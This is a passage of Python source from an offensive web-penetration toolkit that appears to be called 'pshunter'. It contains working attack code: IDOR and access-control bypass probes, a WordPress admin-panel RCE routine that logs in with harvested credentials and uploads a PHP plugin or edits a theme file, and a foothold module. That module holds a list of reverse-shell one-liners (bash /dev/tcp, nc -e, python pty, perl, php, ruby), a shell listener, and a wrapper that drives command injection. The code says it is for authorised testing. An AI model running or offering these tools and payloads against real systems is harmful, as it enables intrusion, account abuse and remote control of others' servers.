            ("X-Forwarded-Host localhost", "GET", p, {"X-Forwarded-Host": "localhost"}),
            ("X-Original-URL", "GET", "/", {"X-Original-URL": p}),
            ("X-Rewrite-URL", "GET", "/", {"X-Rewrite-URL": p}),
            ("trailing slash", "GET", (no_slash + "/") if not p.endswith("/") else p, {}),
            ("dot-segment /%2e", "GET", no_slash + "/%2e", {}),
            ("OPTIONS method", "OPTIONS", p, {}),
        ]

    def _enum_endpoint(ep, extra):
        kind = ep[0]
        if kind == "param":
            _k, host, base, param, orig, label = ep

            def build(nid):
                return _set_param(base, param, str(nid))
        else:
            _k, host, pre, suf, orig, label = ep

            def build(nid):
                return f"{pre}{nid}{suf}"
        o_st, o_body, _c = _req(host, "GET", build(orig), extra=extra)
        if o_st != 200 or not o_body:
            return None, host, label
        b_st, b_body, _c = _req(host, "GET", build(99999999), extra=extra)
        b_len = len(b_body or "")
        recs = []
        for nid in dict.fromkeys(i for i in (1, 2, 3, orig - 1, orig + 1, orig + 2)
                                 if i > 0 and i != orig):
            if time.time() >= deadline:
                break
            st, body, _c = _req(host, "GET", build(nid), extra=extra)
            if st == 200 and body and (b_st != 200 or
                                       abs(len(body) - b_len) > max(64, int(b_len * 0.05))):
                recs.append((nid, body))
        pii = {}
        for nid, body in recs:
            if _PII_RE.search(body):
                pii[hash(body)] = nid                        # distinct bodies → distinct records
        if len(pii) >= 2:
            return "idor", host, f"{label} (IDs {sorted(pii.values())} → distinct PII records)"
        if len({hash(b) for _n, b in recs}) >= 2:
            return "enum", host, f"{label} (IDs enumerable, no PII)"
        return None, host, label

    # ── Technique 1+2: forced browsing + 401/403 bypass ──
    for host, path, _dstatus in _gather_priv_paths(ip, port, proto):
        if time.time() >= deadline:
            break
        _home, notfound = _baseline(host)
        st, body, _c = _req(host, "GET", path)               # unauthenticated
        is_login = bool(body and re.search(r"type=[\"']?password", body, re.I))
        if st == 200 and body and _PRIV_CONTENT_RE.search(body) and not is_login \
                and not _similar(body, notfound):
            bac.append(f"  ✗ BAC {host}{path}  (unauth 200 → privileged content)")
            continue
        if st in (401, 403):
            home_body = _baseline(host)[0]
            for vlabel, method, vpath, extra in _bypass_vectors(path):
                if time.time() >= deadline:
                    break
                bst, bbody, _c = _req(host, method, vpath, extra=extra)
                if bst == 200 and bbody and len(bbody) > 64 \
                        and not re.search(r"type=[\"']?password", bbody, re.I) \
                        and not _similar(bbody, home_body):
                    authz.append(f"  ✗ AUTHZ-BYPASS {host}{path}  (via {vlabel})")
                    break

    # ── Technique 3: IDOR enumeration (unauthenticated) ──
    id_eps = _gather_id_endpoints(ip, port, proto)
    flagged = set()
    for ep in id_eps:
        if time.time() >= deadline:
            break
        verdict, host, detail = _enum_endpoint(ep, None)
        if verdict == "idor":
            idor.append(f"  ✗ IDOR {host}{detail}")
            flagged.add((host, detail.split()[0]))
        elif verdict == "enum":
            enum.append(f"  ⚠ ENUM {host}{detail}")

    # ── Credentialed layer: re-login and re-run enumeration as an authenticated user ──
    creds_used = None
    if time.time() < deadline:
        for chost, cpath, kind, u, p in _parse_valid_creds(ip, port, proto):
            auth_extra = None
            if kind == "Basic":
                auth_extra = {"Authorization": "Basic " + base64.b64encode(
                    f"{u}:{p}".encode()).decode()}
            else:
                gs, gbody, gsc = _req(chost, "GET", cpath)
                form = _parse_login_form(gbody or "", cpath)
                if form:
                    data = dict(form["hidden"])
                    data[form["user"]] = u
                    data[form["pass"]] = p
                    action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{cpath}",
                                                  form["action"] or cpath)
                    pr = urllib.parse.urlparse(action)
                    apath = pr.path + (f"?{pr.query}" if pr.query else "")
                    gcookie = "; ".join(c.split(";")[0] for c in gsc)
                    ex = {"Content-Type": "application/x-www-form-urlencoded"}
                    if gcookie:
                        ex["Cookie"] = gcookie
                    _st, _b, setc = _req(chost, "POST", apath,
                                         body=urllib.parse.urlencode(data), extra=ex)
                    session = "; ".join(c.split(";")[0] for c in setc) or gcookie
                    if setc and session:
                        auth_extra = {"Cookie": session}
            if not auth_extra:
                continue
            creds_used = f"{u}:{p or '<blank>'}@{chost}{cpath}"
            for ep in id_eps:
                if time.time() >= deadline:
                    break
                if ep[1] != chost:
                    continue
                verdict, host, detail = _enum_endpoint(ep, auth_extra)
                if verdict == "idor" and (host, detail.split()[0]) not in flagged:
                    idor.append(f"  ✗ IDOR {host}{detail}  [authenticated as {u}]")
                    flagged.add((host, detail.split()[0]))
            break

    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ IDOR / broken access control probe",
             f"priv paths + id endpoints scanned · IDOR {len(idor)} · BAC {len(bac)} · "
             f"authz-bypass {len(authz)} · enum {len(enum)} · {reason}"
             + (f" · creds: {creds_used}" if creds_used else "")]
    if idor:
        lines.append("\nIDOR (other objects' data reachable):")
        lines += idor
    if bac:
        lines.append("\nBROKEN ACCESS CONTROL (privileged page unauthenticated):")
        lines += bac
    if authz:
        lines.append("\n401/403 AUTHZ BYPASS:")
        lines += authz
    if enum and not idor:
        lines.append("\nENUMERABLE OBJECTS (no PII gate — verify manually):")
        lines += enum
    if not (idor or bac or authz or enum):
        lines.append("\nno IDOR / access-control issue confirmed")
    return "\n".join(lines)


# ── HTTP step 24: CMS-specific scan (wpscan / droopescan orchestrator + stdlib fallback) ──
_CMS_DEADLINE = 300
_CMS_REQ_TIMEOUT = 10
_CMS_SCAN_TIMEOUT = 240        # per external scanner
_CMS_MAX_PLUGINS = 25
_WP_TOP_PLUGINS = [
    "akismet", "contact-form-7", "woocommerce", "elementor", "wordpress-seo", "jetpack",
    "wpforms-lite", "wordfence", "all-in-one-seo-pack", "wp-super-cache", "w3-total-cache",
    "really-simple-ssl", "updraftplus", "classic-editor", "mailchimp-for-wp", "redirection",
    "google-site-kit", "ninja-forms", "advanced-custom-fields", "wp-file-manager",
    "ithemes-security", "backwpup", "duplicate-post", "loginizer", "revslider",
]


def _detect_cms(blob: str) -> tuple:
    """Best-effort CMS + version from a fingerprint blob (services + http-* output + homepage).
    Ordered so the strongest signature wins. Returns (cms|None, version|None)."""
    low = (blob or "").lower()
    if re.search(r"wp-content|wp-json|wp-login|wordpress", low):
        m = re.search(r"wordpress[ /]?(\d+\.\d+(?:\.\d+)?)", low)
        return "wordpress", (m.group(1) if m else None)
    if re.search(r"x-generator:\s*drupal|\bdrupal\b|sites/default|/core/misc/drupal", low):
        m = re.search(r"drupal[ /]?(\d+(?:\.\d+)+)", low)
        return "drupal", (m.group(1) if m else None)
    if re.search(r"\bjoomla\b|/administrator/|com_content|/media/system/js", low):
        m = re.search(r"joomla![ /]?(\d+(?:\.\d+)+)", low)
        return "joomla", (m.group(1) if m else None)
    for nm in ("magento", "typo3", "moodle", "mediawiki", "prestashop", "opencart", "ghost"):
        if nm in low:
            m = re.search(nm + r"[ /]?(\d+(?:\.\d+)+)", low)
            return nm, (m.group(1) if m else None)
    return None, None


def _parse_wpscan_json(data: dict) -> tuple:
    """(version, [vuln lines], [component lines], [users]) from wpscan --format json output."""
    def _cves(v):
        cs = ((v.get("references") or {}).get("cve") or [])
        return " ".join((c if str(c).upper().startswith("CVE") else "CVE-" + str(c)) for c in cs)

    core = data.get("version") or {}
    ver = core.get("number")
    vulns, items, users = [], [], []
    for v in (core.get("vulnerabilities") or []):
        vulns.append(f"core {ver or '?'}: {v.get('title', '?')} {_cves(v)}".strip())
    for section in ("plugins", "themes"):
        for name, info in (data.get(section) or {}).items():
            pv = ((info.get("version") or {}) or {}).get("number")
            vs = info.get("vulnerabilities") or []
            if vs:
                for v in vs:
                    vulns.append(f"{section[:-1]} {name} {pv or '?'}: "
                                 f"{v.get('title', '?')} {_cves(v)}".strip())
            else:
                items.append(f"{section[:-1]} {name}{(' ' + pv) if pv else ''}")
    mt = data.get("main_theme") or {}
    if mt.get("slug"):
        pv = (mt.get("version") or {}).get("number")
        for v in (mt.get("vulnerabilities") or []):
            vulns.append(f"theme {mt.get('slug')} {pv or '?'}: {v.get('title', '?')} {_cves(v)}".strip())
    for u in (data.get("users") or {}):
        users.append(u)
    return ver, vulns, items, users


def _parse_droopescan(out: str) -> tuple:
    """(versions, [component lines]) from droopescan text output. No CVE data — enumeration only."""
    versions = []
    m = re.search(r"Possible version\(s\):\s*\n((?:[ \t]+\S+\n)+)", out or "")
    if m:
        versions = re.findall(r"[ \t]+([\d][\w.]*)", m.group(1))
    items = []
    for sec in re.finditer(r"\[\+\] ([A-Za-z ]+?) identified[^\n]*:\n"
                           r"((?:[ \t]+http\S+\n?)+)", out or ""):
        label = sec.group(1).strip()
        for u in re.findall(r"[ \t]+(http\S+)", sec.group(2)):
            items.append(f"{label}: {u}")
    return versions, items


def _tool_cms_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step-24 tool: fingerprint the CMS, then run its matching external scanner if
    installed (wpscan for WordPress, droopescan for Drupal/Joomla) to surface vulnerable
    plugins/themes/versions and users; otherwise fall back to a stdlib enumeration (version
    files, wp-json user list, common plugin readmes). Read-only — no exploitation or brute
    force. wpscan CVE data needs WPSCAN_API_TOKEN (env). Stdlib only for the fallback; a dead
    server raises."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(path, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CMS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CMS_REQ_TIMEOUT)
            hdr = {"Host": ip, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request("GET", path, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace"), resp.headers
        except Exception:                                     # noqa: BLE001
            return None, None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    # fingerprint blob: services + earlier http-* output + live homepage
    blob = ""
    for (nm, prod, ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x) + " "
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-fingerprint", "http-headers", "http-source", "dir-brute"):
            blob += " " + (output or "")
    st, body, hdrs = _req("/")
    if st is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot CMS-scan")
    blob += " " + (body[:20000] if body else "")
    if hdrs:
        for k in ("Server", "X-Powered-By", "X-Generator", "Link"):
            hv = hdrs.get(k)
            if hv:
                blob += f" {k}: {hv}"

    cms, ver = _detect_cms(blob)
    base = f"{scheme}://{ip}:{port}/"
    deadline = time.time() + _CMS_DEADLINE
    if not cms:
        return (f"{scheme}://{ip}:{port}/ CMS scan\n"
                "no CMS fingerprinted (WordPress / Drupal / Joomla / …)")

    vulns, items, users, notes = [], [], [], []
    engine = "stdlib fallback"

    if cms == "wordpress" and shutil.which("wpscan"):
        engine = "wpscan"
        cmd = ["wpscan", "--url", base, "--no-banner", "--format", "json",
               "--enumerate", "vp,vt,u", "--random-user-agent", "--disable-tls-checks",
               "--request-timeout", "20", "--connect-timeout", "10"]
        tok = os.environ.get("WPSCAN_API_TOKEN")
        if tok:
            cmd += ["--api-token", tok]
        else:
            notes.append("no WPSCAN_API_TOKEN — enumeration only, no CVE mapping")
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=_CMS_SCAN_TIMEOUT)
            data = json.loads(proc.stdout or "{}")
            wver, vulns, items, users = _parse_wpscan_json(data)
            ver = wver or ver
        except subprocess.TimeoutExpired:
            notes.append("wpscan timed out (partial/none)")
        except Exception as exc:                              # noqa: BLE001
            notes.append(f"wpscan parse failed: {exc}")
    elif cms in ("drupal", "joomla", "silverstripe") and shutil.which("droopescan"):
        engine = "droopescan"
        try:
            proc = subprocess.run(["droopescan", "scan", cms, "-u", base, "-t", "8"],
                                  capture_output=True, text=True, timeout=_CMS_SCAN_TIMEOUT)
            versions, items = _parse_droopescan(proc.stdout or "")
            if versions:
                ver = versions[0]
                if len(versions) > 1:
                    notes.append("droopescan version candidates: " + ", ".join(versions[:5]))
        except subprocess.TimeoutExpired:
            notes.append("droopescan timed out (partial/none)")
        except Exception as exc:                              # noqa: BLE001
            notes.append(f"droopescan failed: {exc}")

    if engine == "stdlib fallback":
        notes.append("external scanner not installed — stdlib fallback (versions + user enum)")
        if cms == "wordpress":
            for p in ("/readme.html", "/wp-includes/version.php"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)", b)
                    if m:
                        ver = ver or m.group(1)
            s, b, _h = _req("/wp-json/wp/v2/users")
            if not (s == 200 and b and b.lstrip().startswith("[")):
                s, b, _h = _req("/?rest_route=/wp/v2/users")
            if s == 200 and b and b.lstrip().startswith("["):
                users += re.findall(r'"slug":"([^"]+)"', b)
            for pl in _WP_TOP_PLUGINS[:_CMS_MAX_PLUGINS]:
                if time.time() >= deadline:
                    break
                s, b, _h = _req(f"/wp-content/plugins/{pl}/readme.txt")
                if s == 200 and b and re.search(r"stable tag", b, re.I):
                    pm = re.search(r"[Ss]table tag:\s*([\w.]+)", b)
                    items.append(f"plugin {pl}{(' ' + pm.group(1)) if pm else ''}")
        elif cms == "drupal":
            for p in ("/CHANGELOG.txt", "/core/CHANGELOG.txt"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"Drupal (\d+\.\d+(?:\.\d+)?)", b)
                    if m:
                        ver = ver or m.group(1)
        elif cms == "joomla":
            for p in ("/administrator/manifests/files/joomla.xml",
                      "/language/en-GB/en-GB.xml"):
                s, b, _h = _req(p)
                if s == 200 and b:
                    m = re.search(r"<version>([\d.]+)</version>", b)
                    if m:
                        ver = ver or m.group(1)

    lines = [f"{scheme}://{ip}:{port}/ CMS scan",
             f"CMS: {cms}{(' ' + ver) if ver else ' (version unknown)'}",
             f"engine: {engine}"]
    for n in notes:
        lines.append(f"note: {n}")
    if vulns:
        lines.append("\nVULNERABILITIES:")
        lines += [f"  ✗ CMS-VULN {v}" for v in vulns]
    if items:
        lines.append("\nCOMPONENTS:")
        lines += [f"  {it}" for it in sorted(set(items))]
    if users:
        lines.append("\nUSERS:")
        lines.append(f"  ⚠ CMS-USERS " + ", ".join(sorted(set(users))[:20]))
    if not (vulns or items or users):
        lines.append("\nno components / vulns enumerated")
    return "\n".join(lines)


# ── HTTP step 25: Admin panel → RCE (WordPress; creds-gated, inert, reversible) ──
_ADMINRCE_DEADLINE = 200
_ADMINRCE_REQ_TIMEOUT = 12


def _wp_nonce(html: str, field: str = "_wpnonce") -> "str | None":
    """Pull a WordPress nonce value out of a hidden input, either attribute order."""
    m = (re.search(rf'(?:id|name)="{field}"[^>]*value="([^"]+)"', html or "")
         or re.search(rf'value="([^"]+)"[^>]*(?:id|name)="{field}"', html or ""))
    return m.group(1) if m else None


def _tool_admin_rce(ip: str, port: int, proto: str) -> str:
    """HTTP step-25 tool: turn valid admin credentials into code execution through a WordPress
    admin panel — upload a tiny plugin (primary) or edit an inactive theme file (fallback). The
    payload is INERT (echoes a unique marker × arithmetic, no live shell); success is proven by
    fetching the dropped file back. It is REVERSIBLE: the plugin is deleted / the theme file is
    restored, and anything left behind is listed for manual removal. Gated on credentials found
    by default-creds / login-brute — it will not run blind. Authorised targets only: this writes
    executable code to the target. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import io
    import zipfile
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    base = f"{scheme}://{ip}:{port}/"

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(300000).decode("utf-8", "replace")
            return (resp.status, data, resp.headers.get_all("Set-Cookie") or [],
                    resp.getheader("Location"))
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _merge(jar, setc):
        for c in setc:
            nv = c.split(";", 1)[0].strip()
            if "=" in nv:
                jar[nv.split("=", 1)[0]] = nv
        return "; ".join(jar.values())

    def _wp_login(hostval, u, p):
        jar = {}
        _s, _b, setc, _l = _req(hostval, "GET", "/wp-login.php")
        cookie = _merge(jar, setc)
        body = urllib.parse.urlencode({"log": u, "pwd": p, "wp-submit": "Log In",
                                       "redirect_to": base + "wp-admin/", "testcookie": "1"})
        ex = {"Content-Type": "application/x-www-form-urlencoded",
              "Cookie": (cookie + "; " if cookie else "") + "wordpress_test_cookie=WP+Cookie+check"}
        _s, _b, setc, _l = _req(hostval, "POST", "/wp-login.php", body=body, extra=ex)
        cookie = _merge(jar, setc)
        if "wordpress_logged_in" in cookie:
            return cookie
        st, b, setc, _l = _req(hostval, "GET", "/wp-admin/", extra={"Cookie": cookie})
        if st == 200 and b and "dashboard" in b.lower():
            return _merge(jar, setc)
        return None

    # ── confirm WordPress ──
    blob = ""
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-fingerprint", "http-headers", "http-source", "dir-brute"):
            blob += " " + (output or "")
    st, hb, _sc, _l = _req(ip, "GET", "/")
    if st is None:
        raise RuntimeError(f"{base} unreachable — cannot attempt admin RCE")
    blob += " " + (hb[:20000] if hb else "")
    cms, _ver = _detect_cms(blob)
    if cms != "wordpress":
        return (f"{base} admin-panel RCE\n"
                f"CMS is {cms or 'unknown'} — only WordPress is automated here; "
                "exploit the admin panel manually (upload plugin/theme, edit a template)")

    # ── need working admin creds ──
    creds = [c for c in _parse_valid_creds(ip, port, proto) if c[2] == "form"]
    if not creds:
        return (f"{base} admin-panel RCE\n"
                "no admin credentials available — run default-creds / login-brute first")

    session = None
    for chost, _cpath, _kind, u, p in creds:
        cookie = _wp_login(chost, u, p)
        if cookie:
            session = (chost, cookie, u, p)
            break
    if not session:
        return (f"{base} admin-panel RCE\n"
                "found credentials but none logged into wp-admin (form may differ) — verify manually")

    host, cookie, user, _pw = session
    token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
    slug = "psh" + token
    mark = "PSHADM" + token
    a, b = random.randint(1000, 9999), random.randint(1000, 9999)
    product = str(a * b)
    payload = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>"
    rce, artifacts, tried = [], [], []
    ck = {"Cookie": cookie}

    # ── primary: upload a tiny plugin ──
    st, b_html, _sc, _l = _req(host, "GET", "/wp-admin/plugin-install.php?tab=upload", extra=ck)
    nonce = _wp_nonce(b_html or "")
    if nonce:
        tried.append("plugin upload")
        php = (f"<?php\n/*\nPlugin Name: {slug}\nVersion: 0.0\n*/\n"
               f"echo '{mark}',{a}*{b},'{mark}';\n")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{slug}/{slug}.php", php)
        body, boundary = _multipart({"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
                                    "pluginzip", f"{slug}.zip", "application/zip", buf.getvalue())
        _req(host, "POST", "/wp-admin/update.php?action=upload-plugin", body=body,
             extra={"Cookie": cookie, "Content-Type": f"multipart/form-data; boundary={boundary}"})
        vpath = f"/wp-content/plugins/{slug}/{slug}.php"
        vst, vbody, _sc, _l = _req(host, "GET", vpath)
        if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
            rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  (wordpress: plugin upload)")
            # best-effort cleanup: bulk-delete the plugin
            gs, gb, _s, _l = _req(host, "GET", "/wp-admin/plugins.php", extra=ck)
            dnonce = _wp_nonce(gb or "", "_wpnonce")
            deleted = False
            if dnonce:
                dbody = urllib.parse.urlencode({"action": "delete-selected",
                                                "checked[]": f"{slug}/{slug}.php",
                                                "_wpnonce": dnonce, "verify-delete": "1"})
                _req(host, "POST", "/wp-admin/plugins.php", body=dbody,
                     extra={"Cookie": cookie,
                            "Content-Type": "application/x-www-form-urlencoded"})
                cst, _cb, _s, _l = _req(host, "GET", vpath)
                deleted = (cst == 404)
            if not deleted:
                artifacts.append(f"{host}{vpath}  (plugin '{slug}' — delete in wp-admin/plugins)")

    # ── fallback: edit an inactive theme's file ──
    if not rce:
        st, te, _sc, _l = _req(host, "GET", "/wp-admin/theme-editor.php", extra=ck)
        if st == 200 and te:
            tried.append("theme editor")
            tnonce = _wp_nonce(te, "_wpnonce")
            theme = re.search(r'name="theme"[^>]*value="([^"]+)"', te) or \
                re.search(r'theme=([^"&]+)&(?:amp;)?file=', te)
            phpfile = re.search(r'file=([^"&]+\.php)', te)
            m_orig = re.search(r'<textarea[^>]*id="newcontent"[^>]*>(.*?)</textarea>', te, re.S)
            if tnonce and theme and phpfile:
                tval, fval = theme.group(1), phpfile.group(1)
                orig = m_orig.group(1) if m_orig else ""
                new = (orig or "") + "\n" + payload
                post = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": new,
                                               "action": "update", "file": fval, "theme": tval,
                                               "submit": "Update File"})
                est, _eb, _s, _l = _req(host, "POST", "/wp-admin/theme-editor.php", body=post,
                                        extra={"Cookie": cookie,
                                               "Content-Type": "application/x-www-form-urlencoded"})
                vpath = f"/wp-content/themes/{tval}/{fval}"
                vst, vbody, _sc, _l = _req(host, "GET", vpath)
                if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
                    rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  "
                               f"(wordpress: theme edit {fval})")
                if est in (200, 302):                        # we wrote → always restore the original
                    restore = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": orig,
                                                       "action": "update", "file": fval,
                                                       "theme": tval, "submit": "Update File"})
                    _req(host, "POST", "/wp-admin/theme-editor.php", body=restore,
                         extra={"Cookie": cookie,
                                "Content-Type": "application/x-www-form-urlencoded"})
                    rst, rb, _s, _l = _req(host, "GET", vpath)
                    if rst is not None and rb and f"{mark}{product}{mark}" in rb:
                        artifacts.append(f"{host}{vpath}  (theme file — restore failed, revert manually)")

    lines = [f"{base} admin-panel RCE (WordPress)",
             f"logged in as {user} · tried: {', '.join(tried) or 'none'} · RCE {len(rce)}"]
    if rce:
        lines.append("\nAUTHENTICATED ADMIN → RCE:")
        lines += rce
    if artifacts:
        lines.append("\nartifacts to remove:")
        lines += [f"  {x}" for x in artifacts]
    if not rce:
        lines.append("\nno admin→RCE path succeeded (nonce/permissions?) — try manually")
    return "\n".join(lines)


# ── HTTP step 26: foothold — spawn & auto-upgrade a reverse shell via a confirmed RCE channel ──
_FOOTHOLD_ENUM_TOOLS = ["python3", "python", "socat", "nc", "ncat", "perl", "php", "ruby", "bash",
                        "script"]
# (label, interpreter it needs, reverse-shell payload with {ip}/{port}, already-interactive-pty?)
_REVSHELLS = [
    ("python3 pty", "python3",
     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("python pty", "python",
     "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("socat pty", "socat",
     "socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane", True),
    ("bash /dev/tcp", "bash", "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", False),
    ("nc -e", "nc", "nc {ip} {port} -e /bin/bash", False),
    ("nc mkfifo", "nc",
     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", False),
    ("perl", "perl",
     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
     "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", False),
    ("php", "php",
     "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"/bin/bash -i\","
     "array(0=>$s,1=>$s,2=>$s),$p);'", False),
    ("ruby", "ruby",
     "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
     "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", False),
]
# self-selecting TTY upgrade sent to a dumb shell on connect: python3 → python → script → bash
_FOOTHOLD_UPGRADE = (
    "(command -v python3>/dev/null&&exec python3 -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v python>/dev/null&&exec python -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v script>/dev/null&&exec script -qc /bin/bash /dev/null);exec /bin/bash\n")

_SMART_LISTENER_SRC = r'''
import socket, sys, os, select, time
LPORT = __LPORT__
UPGRADE = __UPGRADE__
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT)); srv.listen(1)
sys.stdout.write("[*] pshunter listener on 0.0.0.0:%d - waiting for the target...\n" % LPORT)
sys.stdout.flush()
conn, addr = srv.accept()
sys.stdout.write("[+] shell from %s:%d\n" % addr); sys.stdout.flush()
try:
    cols, rows = os.get_terminal_size()
except Exception:
    cols, rows = 120, 30
if UPGRADE:
    conn.sendall(UPGRADE); time.sleep(0.6)
conn.sendall(("stty rows %d cols %d 2>/dev/null; export TERM=xterm-256color; "
              "export SHELL=/bin/bash\n" % (rows, cols)).encode())
old = None
try:
    import termios, tty
    old = termios.tcgetattr(0); tty.setraw(0)
except Exception:
    pass
try:
    while True:
        r, _, _ = select.select([0, conn], [], [])
        if 0 in r:
            d = os.read(0, 1024)
            if not d:
                break
            conn.sendall(d)
        if conn in r:
            d = conn.recv(4096)
            if not d:
                break
            os.write(1, d)
finally:
    if old is not None:
        try:
            termios.tcsetattr(0, termios.TCSADRAIN, old)
        except Exception:
            pass
    conn.close()
sys.stdout.write("\n[*] session closed - press enter to close this tab\n")
try:
    input()
except Exception:
    pass
'''


def _parse_cmdi_vectors(ip: str, port: int, proto: str) -> list:
    """(host, path, param, kind, label) confirmed command-injection vectors recorded by
    cmdi-scan (`✗ CMDI /p?param  (echo-based, ; )` under a `[host]` section)."""
    out = []
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "cmdi-scan":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                m = re.match(r"\s*✗ CMDI (\S+?)\?(\S+?)\s+\((\w+)-based,\s*(.+?)\)\s*$", ln)
                if m:
                    out.append((host, m.group(1), m.group(2), m.group(3), m.group(4)))
    return out


def _foothold_lhost(target_ip: str) -> "str | None":
    """Our source IP toward the target (what the target must call back to)."""
    import socket
    try:
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.connect((target_ip, 9))
        myip = u.getsockname()[0]
        u.close()
        return myip
    except Exception:                                         # noqa: BLE001
        return None


def _free_local_port(preferred: int = 4444, span: int = 50) -> int:
    """Return a locally-bindable TCP port for a reverse-shell listener: the preferred one if it's
    free, else the next free port above it (probes the same way the listener binds — SO_REUSEADDR
    on 0.0.0.0 — so a success here means the listener will bind too). Falls back to preferred."""
    import socket
    for cand in [preferred] + [preferred + i for i in range(1, span + 1)]:
        if not 1 <= cand <= 65535:
            continue
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", cand))
            return cand
        except OSError:
            continue
        finally:
            s.close()
    return preferred


def _foothold_channel(ip: str, port: int, proto: str):
    """Rebuild a working command channel from a confirmed echo-based cmdi vector. Returns
    (run(cmd)->output, fire(cmd)->None, description) or None. `run` captures stdout between
    markers; `fire` launches a (backgrounded) command without waiting (for the reverse shell)."""
    import http.client
    import ssl
    import urllib.parse
    vecs = _parse_cmdi_vectors(ip, port, proto)
    if not vecs:
        return None
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    ctx = ssl._create_unverified_context()
    wrapmap = dict(_CMDI_WRAPS)
    dm = "pshFH"

    def _get(host, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=12, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=12)
            conn.request("GET", q, headers={"Host": host, "User-Agent": "pshunter"})
            return conn.getresponse().read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    for host, path, param, kind, label in vecs:
        if kind != "echo":
            continue                                          # need reflected output to drive it
        wrap = wrapmap.get(label)
        if not wrap:
            continue

        def run(cmd, _h=host, _p=path, _pa=param, _w=wrap):
            body = _get(_h, _p, _pa, _w(f"echo {dm}$({cmd}){dm}"))
            if not body:
                return None
